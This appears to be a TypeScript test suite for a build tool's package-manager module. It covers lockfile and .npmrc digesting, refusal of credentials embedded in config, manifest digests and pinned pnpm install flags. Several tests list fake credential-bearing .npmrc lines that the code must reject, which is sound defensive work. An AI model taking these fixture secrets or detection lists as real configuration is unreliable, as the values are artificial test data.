  it("refuses a lockfile touched between the open and the last read", async () => {
    await withFixture("package-manager-touch", async (root) => {
      const lockfile = NodePath.join(root, "pnpm-lock.yaml")
      await Fs.writeFile(lockfile, "lockfileVersion: '9.0'\n", "utf8")
      const later = new Date(Date.now() + 60_000)
      const fileSystem = await hookedFileSystem({ afterDescriptorStat: () => Fs.utimes(lockfile, later, later) })
      const error = await digestOver(fileSystem, root)
      expect(error.message).toMatch(/file changed while it was read/)
    })
  })

  it("refuses a lockfile whose canonical location moves while it is read", async () => {
    await withFixture("package-manager-relocate", async (root) => {
      const lockfile = NodePath.join(root, "pnpm-lock.yaml")
      const elsewhere = NodePath.join(root, "elsewhere.yaml")
      await Fs.writeFile(lockfile, "lockfileVersion: '9.0'\n", "utf8")
      await Fs.writeFile(elsewhere, "lockfileVersion: '9.0'\n", "utf8")
      const fileSystem = await hookedFileSystem({
        afterOpen: async () => {
          await Fs.rm(lockfile)
          await Fs.symlink(elsewhere, lockfile)
        }
      })
      const error = await digestOver(fileSystem, root)
      expect(error.message).toMatch(/file changed its canonical location while read/)
    })
  })

  /**
   * `Action.executeEncoded` encodes a declared error through
   * `Schema.toCodecJson` and `Effect.orDie`s the encode, so an error carrying a
   * raw platform `Error` turned the most ordinary install failure, a missing
   * lockfile, into a defect that killed the run instead of journaling
   * `lockfile_unreadable`.
   */
  it("encodes a missing-lockfile failure, cause and all, as JSON", async () => {
    await withFixture("package-manager-encodes", async (root) => {
      const error = await Effect.runPromise(
        PackageManager.lockfileDigest(root, "pnpm-lock.yaml").pipe(
          Effect.flip,
          Effect.provide(ExecutableFixture.layer)
        )
      )
      const encoded = await Effect.runPromise(
        Schema.encodeEffect(Schema.toCodecJson(PackageManager.PackageManagerError))(error)
      )
      expect(JSON.parse(JSON.stringify(encoded))).toMatchObject({
        code: "lockfile_unreadable",
        cause: { name: "PlatformError", code: "ENOENT" }
      })
      expect(error.message).toMatch(/could not read/)
    })
  })
})

describe("PackageManager project configuration", () => {
  const npmrcRefusal = (root: string) =>
    Effect.runPromise(
      PackageManager.npmrcDigest(root).pipe(Effect.flip, Effect.provide(ExecutableFixture.layer))
    )

  const npmrcValue = (root: string) =>
    Effect.runPromise(PackageManager.npmrcDigest(root).pipe(Effect.provide(ExecutableFixture.layer)))

  it("refuses an uninspectable .npmrc before probing the manager", async () => {
    await withFixture("package-manager-uninspectable-npmrc", async (root) => {
      const real = await Effect.runPromise(
        Effect.gen(function*() {
          return yield* FileSystem.FileSystem
        }).pipe(Effect.provide(ExecutableFixture.layer))
      )
      const fileSystem: FileSystem.FileSystem = {
        ...real,
        exists: (path) =>
          path.endsWith("/.npmrc") ?
            Effect.fail(PlatformError.systemError({
              _tag: "PermissionDenied",
              module: "FileSystem",
              method: "exists",
              pathOrDescriptor: path
            })) :
            real.exists(path)
      }
      const executable = NodePath.join(root, "pnpm.mjs")
      const marker = NodePath.join(root, "spawned")
      await writeExecutable(
        executable,
        `import { writeFileSync } from "node:fs"\nwriteFileSync(${JSON.stringify(marker)}, "yes")`
      )

      const refusal = await Effect.runPromise(
        PackageManager.npmrcDigest(root).pipe(
          Effect.flip,
          Effect.provideService(FileSystem.FileSystem, fileSystem),
          Effect.provide(ExecutableFixture.layer)
        )
      )
      expect(refusal.code).toBe("manifest_unreadable")
      expect(refusal.message).toContain(".npmrc")
      expect(refusal.cause?.name).toBe("PlatformError")

      const manager = await Effect.runPromise(
        PackageManager.makePnpm({ requirement: "11.21.0", projectRoot: root, executable }).pipe(
          Effect.provideService(FileSystem.FileSystem, fileSystem),
          Effect.provide(ExecutableFixture.layer),
          Effect.provide(runtimeLayer)
        )
      )
      const versionFailure = await Effect.runPromise(Effect.flip(manager.version))
      expect(versionFailure.code).toBe("manifest_unreadable")
      expect(versionFailure.cause?.name).toBe("PlatformError")
      await expect(Fs.stat(marker)).rejects.toMatchObject({ code: "ENOENT" })
    })
  })

  it("reports no digest when a project has no .npmrc", async () => {
    await withFixture("package-manager-no-npmrc", async (root) => {
      expect(await npmrcValue(root)).toBe(null)
    })
  })

  it("digests a credential-free .npmrc and re-digests it when it changes", async () => {
    await withFixture("package-manager-npmrc-digest", async (root) => {
      await Fs.writeFile(NodePath.join(root, ".npmrc"), "registry=https://registry.example/\n", "utf8")
      const first = await npmrcValue(root)
      expect(first).toMatch(/^[0-9a-f]{64}$/)
      await Fs.writeFile(NodePath.join(root, ".npmrc"), "registry=https://other.example/\n", "utf8")
      expect(await npmrcValue(root)).not.toBe(first)
    })
  })

  /**
   * The credential check matched a credential-shaped key and nothing else, so
   * a password written into a registry or proxy URL passed it and was digested
   * into install key material under an ordinary name.
   */
  it("refuses a credential carried as URL userinfo under any setting name", async () => {
    await withFixture("package-manager-userinfo", async (root) => {
      for (
        const line of [
          "registry=https://user:password@registry.example/",
          "@scope:registry=https://user:password@registry.example/",
          "https-proxy=https://user:password@proxy.example",
          "proxy=http://user%40corp:pw@proxy.example",
          "//registry.example/:_authToken=literal-secret"
        ]
      ) {
        await Fs.writeFile(NodePath.join(root, ".npmrc"), `${line}\n`, "utf8")
        const error = await npmrcRefusal(root)
        expect(error.code).toBe("unsafe_configuration")
        expect(error.message).toMatch(/embeds a credential/)
      }
    })
  })

  it.each([
    "key=\"-----BEGIN PRIVATE KEY-----\\nfixture-key\\n-----END PRIVATE KEY-----\"",
    "//registry.example/:key=literal-key",
    "otp=123456",
    "_auth=base64",
    "_password=pw",
    "//registry.example/:_password=pw",
    "certfile=./cert.pem",
    "keyfile=./key.pem",
    "token=literal-token",
    "_authToken =x"
  ])("refuses literal credential setting %s for digests and child execution", async (line) => {
    await withFixture("package-manager-credential", async (root) => {
      await Fs.writeFile(NodePath.join(root, ".npmrc"), `${line}\n`, "utf8")
      const error = await npmrcRefusal(root)
      expect(error.code).toBe("unsafe_configuration")
      expect(error.message).toMatch(/embeds a credential/)
      const executable = NodePath.join(root, "pnpm.mjs")
      const marker = NodePath.join(root, "spawned")
      await writeExecutable(
        executable,
        `import { writeFileSync } from "node:fs"\nwriteFileSync(${JSON.stringify(marker)}, "yes")`
      )
      const manager = await makePnpm(root, executable)
      await expect(Effect.runPromise(manager.version)).rejects.toThrow(/embeds a credential/)
      await expect(Fs.stat(marker)).rejects.toMatchObject({ code: "ENOENT" })
    })
  })

  it.each(["monkey", "mytoken", "some_auth", "keyfile-extra"])(
    "matches credential setting names as a whole: %s",
    async (name) => {
      await withFixture("package-manager-credential-name", async (root) => {
        await Fs.writeFile(NodePath.join(root, ".npmrc"), `${name}=ordinary-value\n`, "utf8")
        expect(await npmrcValue(root)).toMatch(/^[0-9a-f]{64}$/)
      })
    }
  )

  it("accepts a placeholder the way npm's ini parser reads it", async () => {
    await withFixture("package-manager-placeholder", async (root) => {
      for (
        const line of [
          "//registry.example/:_password=${NPM_PASSWORD}",
          "//registry.example/:username=${NPM_USER}",
          "//registry.example/:_auth=${NPM_AUTH}",
          "//registry.example/:_authToken=${NPM_TOKEN}",
          "//registry.example/:_authToken=\"${NPM_TOKEN}\"",
          "//registry.example/:_authToken='${NPM_TOKEN}'",
          "registry=https://registry.example/",
          "; _authToken=commented-out",
          "# token=commented-out",
          "not-a-url=this:is/not//a-url@all"
        ]
      ) {
        await Fs.writeFile(NodePath.join(root, ".npmrc"), `${line}\n`, "utf8")
        expect(await npmrcValue(root)).toMatch(/^[0-9a-f]{64}$/)
      }
    })
  })

  /**
   * The child environment was an object literal, so every `Object.prototype`
   * name read as already set and a `.npmrc` legitimately referencing one had
   * its variable silently dropped instead of forwarded.
   */
  it("forwards a referenced variable named after an Object.prototype member", async () => {
    await withFixture("package-manager-proto-name", async (root) => {
      const executable = NodePath.join(root, "pnpm.mjs")
      const observed = NodePath.join(root, "observed.json")
      await Fs.writeFile(NodePath.join(root, ".npmrc"), "//registry.example/:_authToken=${constructor}\n", "utf8")
      await writeExecutable(
        executable,
        `import { writeFileSync } from "node:fs"\n` +
          `writeFileSync(${JSON.stringify(observed)}, JSON.stringify(process.env.constructor ?? null))\n` +
          `process.stdout.write("11.21.0\\n")`
      )
      const manager = await makePnpm(root, executable, {
        environment: { PATH: process.env.PATH, constructor: "registry-host" }
      })
      expect(await Effect.runPromise(manager.version)).toBe("11.21.0")
      expect(JSON.parse(await Fs.readFile(observed, "utf8"))).toBe("registry-host")
    })
  })
})

describe("PackageManager manifests", () => {
  const platformInput = { os: "linux", arch: "x64", libc: null }
  const validInput = {
    manager: "pnpm",
    managerVersion: "11.21.0",
    platform: platformInput,
    lockfileDigest: "a".repeat(64),
    npmrcDigest: "b".repeat(64)
  } as const

  /**
   * The canonical text and its digest are step-key material, and the version
   * prefix exists so a change to the shape cannot collide with a digest minted
   * under the old one. Freezing both here is what makes that promise checkable:
   * reordering a field or adding one now fails rather than silently
   * invalidating every recorded install.
   */
  it("renders one frozen canonical text and one frozen digest", async () => {
    expect(PackageManager.storeManifestText(validInput)).toBe(
      "[\"smithers-build/store-manifest/v1\",\"pnpm\",\"11.21.0\",[\"linux\",\"x64\",null],"
        + `"${"a".repeat(64)}","${"b".repeat(64)}"]`
    )
    const manifest = await Effect.runPromise(
      PackageManager.storeManifest(validInput).pipe(Effect.provide(ExecutableFixture.layer))
    )
    expect(manifest.digest).toBe("6f5246c3848639c37da7cc2c66e8d67979505f9fddf1c734da358748209f6eac")
    expect(manifest.manager).toBe("pnpm")
    expect(manifest.managerVersion).toBe("11.21.0")
    expect(manifest.platform).toEqual(platformInput)
  })

  it("versions the canonical tuple when pnpm configuration is present", () => {
    const pnpmfileDigest = "c".repeat(64)
    const workspaceDigest = "d".repeat(64)
    expect(JSON.parse(PackageManager.storeManifestText({ ...validInput, pnpmfileDigest, workspaceDigest })))
      .toEqual([
        "smithers-build/store-manifest/v2",
        "pnpm",
        "11.21.0",
        ["linux", "x64", null],
        validInput.lockfileDigest,
        validInput.npmrcDigest,
        pnpmfileDigest,
        workspaceDigest
      ])
    expect(PackageManager.storeManifestText({ ...validInput, pnpmfileDigest: null, workspaceDigest: null }))
      .toBe(PackageManager.storeManifestText(validInput))
    for (const key of ["pnpmfileDigest", "workspaceDigest"] as const) {
      expect(() => PackageManager.storeManifestText({ ...validInput, [key]: "invalid" }))
        .toThrow(/lowercase SHA-256 digest or null/)
    }
  })

  it("gives every field a distinct digest", async () => {
    const digestOf = (input: Parameters<typeof PackageManager.storeManifest>[0]) =>
      Effect.runPromise(
        PackageManager.storeManifest(input).pipe(
          Effect.map((manifest) => manifest.digest),
          Effect.provide(ExecutableFixture.layer)
        )
      )
    const base = await digestOf(validInput)
    const variants = [
      { ...validInput, manager: "bun" as const },
      { ...validInput, managerVersion: "11.21.1" },
      { ...validInput, platform: null },
      { ...validInput, platform: { ...platformInput, arch: "arm64" } },
      { ...validInput, lockfileDigest: "c".repeat(64) },
      { ...validInput, npmrcDigest: null },
      { ...validInput, pnpmfileDigest: "c".repeat(64) },
      { ...validInput, workspaceDigest: "c".repeat(64) }
    ]
    const digests = await Promise.all(variants.map(digestOf))
    expect(new Set([base, ...digests]).size).toBe(digests.length + 1)
  })

  it("refuses store-manifest inputs that are not the shape the digest promises", () => {
    expect(() => PackageManager.storeManifestText({ ...validInput, manager: "npm" as never }))
      .toThrow(/manager is unsupported/)
    expect(() => PackageManager.storeManifestText({ ...validInput, managerVersion: "11.21.0\n" }))
      .toThrow(/bounded single-line usable text/)
    expect(() => PackageManager.storeManifestText({ ...validInput, lockfileDigest: "A".repeat(64) }))
      .toThrow(/lowercase SHA-256 digest/)
    expect(() => PackageManager.storeManifestText({ ...validInput, npmrcDigest: "short" }))
      .toThrow(/lowercase SHA-256 digest or null/)
    expect(() => PackageManager.storeManifestText({ ...validInput, extra: 1 } as never))
      .toThrow(/unknown property/)
    expect(() => PackageManager.storeManifestText({ ...validInput, platform: { os: "linux", arch: "" } as never }))
      .toThrow(/os and arch must be non-empty usable text/)
    expect(() =>
      PackageManager.storeManifestText({ ...validInput, platform: { os: null, arch: "x64", libc: null } as never })
    ).toThrow(/os and arch must be non-empty usable text/)
  })

  it("renders one frozen linked-tree digest and refuses anything but three digests", async () => {
    const manifest = await Effect.runPromise(
      PackageManager.linkedTreeManifest({
        storeDigest: "c".repeat(64) as PackageManager.Digest,
        packageJsonDigest: "d".repeat(64) as PackageManager.Digest,
        managerEvidence: "e".repeat(64) as PackageManager.Digest
      }).pipe(Effect.provide(ExecutableFixture.layer))
    )
    expect(manifest).toBe("55a1c29f0e23410f4962a2199622841f8e7c02b2dabec967d1fe88eeacd3e484")
    await expect(Effect.runPromise(
      PackageManager.linkedTreeManifest({
        storeDigest: "not-a-digest" as PackageManager.Digest,
        packageJsonDigest: "d".repeat(64) as PackageManager.Digest,
        managerEvidence: "e".repeat(64) as PackageManager.Digest
      }).pipe(Effect.provide(ExecutableFixture.layer))
    )).rejects.toThrow(/lowercase SHA-256 digests/)
  })
})

describe("PackageManager layers", () => {
  const resolve = <A>(
    layer: ReturnType<typeof PackageManager.layerNoop>,
    read: (service: PackageManager.Service) => A
  ) =>
    Effect.runPromise(
      Effect.gen(function*() {
        return read(yield* PackageManager.PackageManager)
      }).pipe(Effect.provide(layer))
    )

  it("provides each manager implementation through its own layer", async () => {
    const options = { requirement: "11.21.0", projectRoot: "/workspace" }
    expect(await resolve(PackageManager.layerNoop("bun", options, platform), (service) => service.name)).toBe("bun")
    for (
      const [name, layer] of [
        ["pnpm", PackageManager.layerPnpm(options)],
        ["bun", PackageManager.layerBun(options)]
      ] as const
    ) {
      const resolved = await Effect.runPromise(
        Effect.gen(function*() {
          const service = yield* PackageManager.PackageManager
          return { name: service.name, store: service.storeDirectory }
        }).pipe(
          Effect.provide(layer),
          Effect.provide(ExecutableFixture.layer),
          Effect.provide(runtimeLayer)
        )
      )
      expect(resolved).toEqual({ name, store: `.flows/store/${name}` })
    }
  })

  it("refuses a manager name outside the declared union", () => {
    expect(() => PackageManager.makeNoop("npm" as never, { requirement: "1.0.0", projectRoot: "/w" }, platform))
      .toThrow(/name is unsupported/)
  })

  it("reports the refusal code every unwired operation answers with", async () => {
    const service = PackageManager.makeNoop("bun", { requirement: "1.0.0", projectRoot: "/w" }, platform)
    for (const operation of [service.version, service.verify, service.fetch, service.link, service.linkManifest]) {
      const error = await Effect.runPromise(Effect.flip(operation as Effect.Effect<never, never, never>))
      expect((error as PackageManager.PackageManagerError).code).toBe("unsupported")
    }
  })
})

describe("PackageManager link", () => {
  it("pins pnpm install to the offline, frozen, non-mutating flags README documents", async () => {
    await withFixture("package-manager-link-args", async (root) => {
      const executable = NodePath.join(root, "pnpm.mjs")
      const invocation = NodePath.join(root, "invocation.json")
      await writeExecutable(
        executable,
        `if (process.argv[2] === "--version") { process.stdout.write("11.21.0\\n"); process.exit(0) }\n` +
          `import { writeFileSync } from "node:fs"\nwriteFileSync(${
            JSON.stringify(invocation)
          }, JSON.stringify(process.argv.slice(2)))`
      )
      const manager = await makePnpm(root, executable)
      await Effect.runPromise(manager.link)
      const args: Array<string> = JSON.parse(await Fs.readFile(invocation, "utf8"))
      expect(args.slice(0, -1)).toEqual([
        "install",
        "--offline",
        "--frozen-lockfile",
        "--ignore-scripts",
        "--reporter=append-only",
        "--ignore-pnpmfile",
        "--store-dir"
      ])
      expect(NodePath.resolve(args.at(-1)!)).toBe(NodePath.join(root, ".flows/store/pnpm"))
    })
  })

  it("digests the modules manifest pnpm leaves behind, and reports a missing one", async () => {
    await withFixture("package-manager-link-manifest", async (root) => {
      const executable = NodePath.join(root, "pnpm.mjs")
      await writeExecutable(executable, "process.stdout.write('11.21.0\\n')")
      const manager = await makePnpm(root, executable)
      const absent = await Effect.runPromise(
        Effect.flip(manager.linkManifest).pipe(Effect.provide(ExecutableFixture.layer))
      )
      expect(absent.code).toBe("manifest_unreadable")

      await Fs.mkdir(NodePath.join(root, "node_modules"))
      await Fs.writeFile(NodePath.join(root, "node_modules/.modules.yaml"), "hoistPattern: []\n", "utf8")
      const digest = await Effect.runPromise(manager.linkManifest.pipe(Effect.provide(ExecutableFixture.layer)))
      expect(digest).toMatch(/^[0-9a-f]{64}$/)
    })
  })

  it("holds the host manager to the declaration and names the code it refused with", async () => {
    await withFixture("package-manager-verify", async (root) => {
      const executable = NodePath.join(root, "pnpm.mjs")
      await writeExecutable(executable, "process.stdout.write('10.0.0\\n')")
      const manager = await makePnpm(root, executable)
      const mismatch = await Effect.runPromise(Effect.flip(manager.verify))
      expect(mismatch.code).toBe("environment_mismatch")
      expect(mismatch.message).toMatch(/this host runs pnpm 10\.0\.0, and the workspace declares 11\.21\.0/)

      const unsupported = await Effect.runPromise(
        PackageManager.makePnpm({ requirement: "^11.0.0", projectRoot: root, executable, environment: process.env })
          .pipe(
            Effect.flatMap((service) => Effect.flip(service.verify)),
            Effect.provide(ExecutableFixture.layer),
            Effect.provide(runtimeLayer)
          )
      )
      expect(unsupported.code).toBe("environment_mismatch")
      expect(unsupported.message).toMatch(/is not an exact version or a single comparator/)
    })
  })
})
